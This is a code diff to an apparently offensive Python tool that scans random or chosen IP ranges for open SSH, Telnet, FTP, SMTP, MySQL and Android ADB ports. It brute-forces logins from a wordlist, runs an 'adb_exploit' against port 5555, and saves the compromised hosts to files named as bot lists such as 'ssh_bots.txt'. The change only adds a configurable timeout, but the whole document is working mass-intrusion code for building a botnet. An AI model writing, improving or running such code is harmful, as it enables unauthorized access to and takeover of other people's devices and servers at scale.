@@ -47,6 +47,7 @@ def getip():
 class iots(threading.Thread):
  def run(self):
   self.ip_seg=ip_seg
+  self.timeout=_timeout
   while (stop!=True):
    if self.ip_seg==None:
      ip=getip()
@@ -55,7 +56,7 @@ class iots(threading.Thread):
    i=False
    try:
     so=socket.socket()
-    so.settimeout(3)
+    so.settimeout(self.timeout)
     so.connect((ip,22))
     i=True
    except Exception as ex: 
@@ -66,20 +67,22 @@ class iots(threading.Thread):
       username=x.split(':')[0]
       password=x.split(':')[1]
       if wido==True:
-       q=ssh_win(ip,username=username,password=password)
+       q=ssh_win(ip,username=username,password=password,timeout=self.timeout)
       elif termux==True:
-       q=ssh_andro(ip,username=username,password=password)
+       q=ssh_andro(ip,username=username,password=password,timeout=self.timeout)
       else:
-       q=ssh_linux(ip,username=username,password=password)
+       q=ssh_linux(ip,username=username,password=password,timeout=self.timeout)
       if q==True:
        ip+=':'+username+':'+password
        print (ip)
        write_file(ip,filen)
      except Exception as e: 
       pass
-def mass_ssh(threads=100,word_list=wordlist,filename='ssh_bots.txt',ip_range=None):
+def mass_ssh(threads=100,word_list=wordlist,filename='ssh_bots.txt',ip_range=None,timeout=5):
  global stop
  stop=False
+ global _timeout
+ _timeout=timeout
  global ip_seg
  ip_seg=ip_range
  create_file(filename)
@@ -109,6 +112,7 @@ def mass_ssh(threads=100,word_list=wordlist,filename='ssh_bots.txt',ip_range=Non
 class iott(threading.Thread):
  def run(self):
   self.ip_seg=ip_seg
+  self.timeout=_timeout
   while (stop!=True):
    if self.ip_seg==None:
      ip=getip()
@@ -117,13 +121,13 @@ class iott(threading.Thread):
    i=False
    try:
     so=socket.socket()
-    so.settimeout(3)
+    so.settimeout(self.timeout)
     so.connect((ip,23))
     i=True
    except Exception as ex: 
     pass
    if i==True:
-    if exposed_telnet(ip)==True:
+    if exposed_telnet(ip,timeout=self.timeout)==True:
         """ip+='::'
         print (ip)
         write_file(ip,filen)"""
@@ -140,9 +144,11 @@ class iott(threading.Thread):
         write_file(ip,filen)
       except Exception as e: 
        pass
-def mass_telnet(threads=500,word_list=wordlist,filename='telnet_bots.txt',ip_range=None):
+def mass_telnet(threads=500,word_list=wordlist,filename='telnet_bots.txt',ip_range=None,timeout=5):
  global stop
  stop=False
+ global _timeout
+ _timeout=timeout
  global ip_seg
  ip_seg=ip_range
  create_file(filename)
@@ -172,6 +178,7 @@ def mass_telnet(threads=500,word_list=wordlist,filename='telnet_bots.txt',ip_ran
 class iotelt(threading.Thread):
  def run(self):
   self.ip_seg=ip_seg
+  self.timeout=_timeout
   while (stop!=True):
    if self.ip_seg==None:
      ip=getip()
@@ -180,22 +187,24 @@ class iotelt(threading.Thread):
    i=False
    try:
     so=socket.socket()
-    so.settimeout(3)
+    so.settimeout(self.timeout)
     so.connect((ip,23))
     i=True
    except Exception as ex: 
     pass
    if i==True:
      try:
-      q= exposed_telnet(ip)
+      q= exposed_telnet(ip,timeout=self.timeout)
       if q==True:
        print (ip)
        write_file(ip,filen)
      except Exception as e: 
       pass
-def mass_exposed_telnet(threads=500,filename='exposed_telnet_bots.txt',ip_range=None):
+def mass_exposed_telnet(threads=500,filename='exposed_telnet_bots.txt',ip_range=None,timeout=5):
  global stop
  stop=False
+ global _timeout
+ _timeout=timeout
  global ip_seg
  ip_seg=ip_range
  create_file(filename)
@@ -225,6 +234,7 @@ def mass_exposed_telnet(threads=500,filename='exposed_telnet_bots.txt',ip_range=
 class iotf1(threading.Thread):
  def run(self):
   self.ip_seg=ip_seg
+  self.timeout=_timeout
   while (stop!=True):
    if self.ip_seg==None:
      ip=getip()
@@ -233,7 +243,7 @@ class iotf1(threading.Thread):
    i=False
    try:
     so=socket.socket()
-    so.settimeout(3)
+    so.settimeout(self.timeout)
     so.connect((ip,21))
     i=True
    except Exception as ex: 
@@ -243,15 +253,17 @@ class iotf1(threading.Thread):
      try:
       username=x.split(':')[0]
       password=x.split(':')[1]
-      if ftp(ip,username=username,password=password)==True:
+      if ftp(ip,username=username,password=password,timeout=self.timeout)==True:
        ip+=':'+username+':'+password
        print (ip)
        write_file(ip,filen)
      except Exception as e: 
       pass
-def mass_ftp(threads=100,meth=1,word_list=wordlist,filename='ftp_bots.txt',ip_range=None):
+def mass_ftp(threads=100,meth=1,word_list=wordlist,filename='ftp_bots.txt',ip_range=None,timeout=5):
  global ip_seg
  ip_seg=ip_range
+ global _timeout
+ _timeout=timeout
  global stop
  stop=False
  create_file(filename)
@@ -281,6 +293,7 @@ def mass_ftp(threads=100,meth=1,word_list=wordlist,filename='ftp_bots.txt',ip_ra
 class iotf2(threading.Thread):
  def run(self):
   self.ip_seg=ip_seg
+  self.timeout=_timeout
   while (stop!=True):
    if self.ip_seg==None:
      ip=getip()
@@ -289,21 +302,23 @@ class iotf2(threading.Thread):
    i=False
    try:
     so=socket.socket()
-    so.settimeout(3)
+    so.settimeout(self.timeout)
     so.connect((ip,21))
     i=True
    except Exception as ex: 
     pass
    if i==True:
      try:
-      if ftp_anon(ip)==True:
+      if ftp_anon(ip,timeout=self.timeout)==True:
        print (ip)
        write_file(ip,filen)
      except Exception as e: 
       pass
-def mass_ftp_anon(threads=100,filename='ftp_anon_bots.txt',ip_range=None):
+def mass_ftp_anon(threads=100,filename='ftp_anon_bots.txt',ip_range=None,timeout=5):
  global ip_seg
  ip_seg=ip_range
+ global _timeout
+ _timeout=timeout
  global stop
  stop=False
  create_file(filename)
@@ -331,6 +346,7 @@ def mass_ftp_anon(threads=100,filename='ftp_anon_bots.txt',ip_range=None):
 class iotsm(threading.Thread):
  def run(self):
   self.ip_seg=ip_seg
+  self.timeout=_timeout
   while (stop!=True):
    if self.ip_seg==None:
      ip=getip()
@@ -338,7 +354,7 @@ class iotsm(threading.Thread):
      ip=self.ip_seg.format(random.randint(0,255),random.randint(0,255),random.randint(0,255),random.randint(0,255))
    try:
     so=socket.socket()
-    so.settimeout(3)
+    so.settimeout(self.timeout)
     so.connect((ip,25))
     i=True
    except Exception as ex: 
@@ -354,9 +370,11 @@ class iotsm(threading.Thread):
        write_file(ip,filen)
      except Exception as e: 
       pass
-def mass_smtp(o,threads=100,word_list=wordlist,filename='smtp_bots.txt',ip_range=None):
+def mass_smtp(o,threads=100,word_list=wordlist,filename='smtp_bots.txt',ip_range=None,timeout=5):
  global ip_seg
  ip_seg=ip_range
+ global _timeout
+ _timeout=timeout
  global stop
  stop=False
  create_file(filename)
@@ -388,6 +406,7 @@ def mass_smtp(o,threads=100,word_list=wordlist,filename='smtp_bots.txt',ip_range
 class iotmy(threading.Thread):
  def run(self):
   self.ip_seg=ip_seg
+  self.timeout=_timeout
   while (stop!=True):
    if self.ip_seg==None:
      ip=getip()
@@ -396,7 +415,7 @@ class iotmy(threading.Thread):
    i=False
    try:
     so=socket.socket()
-    so.settimeout(3)
+    so.settimeout(self.timeout)
     so.connect((ip,3306))
     i=True
    except Exception as ex: 
@@ -412,9 +431,11 @@ class iotmy(threading.Thread):
        write_file(ip,filen)
      except Exception as e: 
       pass
-def mass_mysql(threads=100,word_list=wordlist,filename='mysql_bots.txt',ip_range=None):
+def mass_mysql(threads=100,word_list=wordlist,filename='mysql_bots.txt',ip_range=None,timeout=5):
  global ip_seg
  ip_seg=ip_range
+ global _timeout
+ _timeout=timeout
  global stop
  stop=False
  create_file(filename)
@@ -445,6 +466,7 @@ class iotmy2(threading.Thread):
  def run(self):
   s=mysql
   self.ip_seg=ip_seg
+  self.timeout=_timeout
   while (stop!=True):
    if self.ip_seg==None:
      ip=getip()
@@ -453,7 +475,7 @@ class iotmy2(threading.Thread):
    i=False
    try:
     so=socket.socket()
-    so.settimeout(3)
+    so.settimeout(self.timeout)
     so.connect((ip,3306))
     i=True
    except Exception as ex: 
@@ -466,9 +488,11 @@ class iotmy2(threading.Thread):
        write_file(ip,filen)
      except Exception as e: 
       pass
-def mass_mysql_default(threads=100,word_list=wordlist,filename='mysql_default_bots.txt',ip_range=None):
+def mass_mysql_default(threads=100,word_list=wordlist,filename='mysql_default_bots.txt',ip_range=None,timeout=5):
  global ip_seg
  ip_seg=ip_range
+ global _timeout
+ _timeout=timeout
  global stop
  stop=False
  create_file(filename)
@@ -498,6 +522,7 @@ def mass_mysql_default(threads=100,word_list=wordlist,filename='mysql_default_bo
 class iotadb(threading.Thread):
  def run(self):
   self.ip_seg=ip_seg
+  self.timeout=_timeout
   while (stop!=True):
    if self.ip_seg==None:
      ip=getip()
@@ -506,22 +531,24 @@ class iotadb(threading.Thread):
    i=False
    try:
     so=socket.socket()
-    so.settimeout(3)
+    so.settimeout(self.timeout)
     so.connect((ip,5555))
     i=True
    except Exception as ex: 
     pass
    if i==True:
      try:
-      q=adb_exploit(ip)
+      q=adb_exploit(ip,timeout=self.timeout)
       if q==True:
        print (ip)
        write_file(ip,filen)
      except Exception as e: 
       pass
-def mass_adb(threads=100,word_list=wordlist,filename='adb_bots.txt',ip_range=None):
+def mass_adb(threads=100,word_list=wordlist,filename='adb_bots.txt',ip_range=None,timeout=5):
  global ip_seg
  ip_seg=ip_range
+ global _timeout
+ _timeout=timeout
  global stop
  stop=False
  create_file(filename)
